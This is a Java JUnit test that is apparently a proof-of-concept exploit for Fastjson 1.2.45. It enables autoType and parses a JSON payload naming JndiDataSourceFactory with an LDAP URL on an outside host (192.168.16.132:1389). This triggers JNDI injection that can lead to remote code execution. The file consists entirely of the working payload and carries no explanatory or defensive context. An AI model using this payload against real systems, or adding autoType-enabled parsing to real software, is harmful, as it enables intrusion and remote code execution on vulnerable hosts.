import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.Test;

public class fastjson_1_2_45 {
    @Test
    public void demo() throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String v1_2_45 = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://192.168.16.132:1389/siflky\"}}";
        Object parse = JSON.parse(v1_2_45);
    }
}
